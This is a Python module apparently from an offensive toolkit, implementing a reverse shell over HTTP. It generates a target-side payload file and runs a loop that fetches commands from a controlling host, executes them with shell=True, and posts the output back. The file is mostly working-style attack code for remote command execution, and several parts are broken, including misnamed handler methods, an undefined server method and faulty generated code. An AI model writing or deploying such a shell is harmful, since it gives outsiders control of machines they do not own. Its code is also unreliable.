"""
Reverse Shell HTTP Server Connection

This module provides a client-server connection for a reverse shell over HTTP. It includes functions to generate a reverse shell exploit payload, start the server, and establish a client connection.

Classes:
- ReverseShellHTTPServerConnection: Manages the client-server connection for the reverse shell over HTTP.

Usage:
1. Create an instance of the 'ReverseShellHTTPServerConnection' class by providing the target host and port, as well as the local host and port.
2. The 'generate_exploit' function generates a reverse shell exploit payload and saves it to a file.
3. The 'payload' function starts the HTTP server on the local host for receiving reverse shell commands.
4. The server listens for incoming HTTP requests, executes received commands, and sends back results.

Note: Modify the code to adapt the target and local host/port configurations for your specific use case.
"""

import time
import requests
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from termcolor import colored
from utils.logger import CustomLogger
from abc import ABC, abstractmethod

logger = CustomLogger("reverse_http_shell_payload.log", 1).get_logger()

class PayloadBase(ABC):

    @abstractmethod
    def payload(self):
        """ Abstarct method for payload server activation"""
        pass

class HTTPHandler(BaseHTTPRequestHandler):
    '''
    A custom HTTP request handler class.

    Handles GET and POST requests for the reverse shell payload.

    Attributes:
        None
    '''
    def request_GET(self):
        '''
        Handle GET requests.

        Reads user input, sends a response, and logs any errors.

        Args:
            None

        Returns:
            None
        '''
        try:
            command = input("Shell: ")
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(command.encode())
        except Exception as e:
            error_message = colored(f"Error: {str(e)}", "red")
            self.wfile.write(error_message.encode())
            logger.error(f"Error in request_GET: {str(e)}")

    # This script will generate a raw text on next releases. This is only an example.
    def request_POST(self):
        '''
        Handle POST requests.

        Reads and executes a command, sends the result, and logs any errors.

        Args:
            None

        Returns:
            None
        '''
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            result = subprocess.run(post_data, shell=True, capture_output=True, text=True)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(result.stdout.encode())
            self.wfile.write(result.stderr.encode())
        except Exception as e:
            error_message = colored(f"Error: {str(e)}", "red")
            self.wfile.write(error_message.encode())
            logger.error(f"Error in request_POST: {str(e)}")

class ReverseShellHTTPServerConnection:
    """
    ServerConnection class for handling HTTP server and reverse shell connections.

    Attributes:
        target_host (str): The target host or IP address.
        target_port (int): The target port for the HTTP server.
    """
    def __init__(self, target_host, target_port, local_host, local_port, mode):
        self.target_host = target_host
        self.target_port = target_port
        self.local_host = local_host
        self.local_port = local_port
        self.mode = mode

        if self.mode == "generate":
            self.generate_reverse_http_exploit()
        elif self.mode == "listener":
            self.payload()

    def generate_reverse_http_exploit(self):
        code =  f"""
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from termcolor import colored

class HTTPHandler(BaseHTTPRequestHandler):
    '''
    A custom HTTP request handler class.

    Handles GET and POST requests for the reverse shell payload.

    Attributes:
        None
    '''
    def request_GET(self):
        '''
        Handle GET requests.

        Reads user input, sends a response, and logs any errors.

        Args:
            None

        Returns:
            None
        '''
        try:
            command = input("Shell: ")
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(command.encode())
        except Exception as e:
            error_message = colored(f"An error occured", "red")
            self.wfile.write(error_message.encode())

    # This script will generate a raw text on next releases. This is only an example.
    def request_POST(self):
        '''
        Handle POST requests.

        Reads and executes a command, sends the result, and logs any errors.

        Args:
            None

        Returns:
            None
        '''
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            result = subprocess.run(post_data, shell=True, capture_output=True, text=True)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(result.stdout.encode())
            self.wfile.write(result.stderr.encode())
        except Exception as e:
            error_message = colored(f"An error occured", "red")
            self.wfile.write(error_message.encode())

class TargetServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def start_http_server(self):
        server_address = (self.target_host, self.target_port)
        try:
            httpd = HTTPServer(server_address, HTTPHandler)
            print(f"Connection waiting..")
            httpd.serve_forever()
        except Exception as e:
            error_string = colored("An error occurred!\n", "red")
            print(f"Server did not start. Please check host and port information.")
if __name__ == __main__:
    target_server = TargetServer({self.target_host}, {self.target_port})
"""

        with open("../exploits/rev_http.py", "w") as file:
            file.write(code)
            print(f"Exploit code has been generated.")

    def payload(self):
        """
        Initialize the listener for receiving reverse shell commands.

        Args:
            None

        Returns:
            None
        """
        server_thread = threading.Thread(target=self.start_http_server)
        server_thread.start()

        while True:
            try:
                req = requests.get(self.local_host)
                req.raise_for_status()

                command = req.text

                if 'terminate' in command:
                    break
                else:
                    subprocess_command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    post_response = requests.post(url=self.local_host, data=subprocess_command.stdout.read())
                    post_response = requests.post(url=self.local_host, data=subprocess_command.stderr.read())

                time.sleep(3)
            except Exception as e:
                error_message = colored(f"Error: {str(e)}", "red")
                print(error_message)
                logger.error(f"Error in payload: {str(e)}")
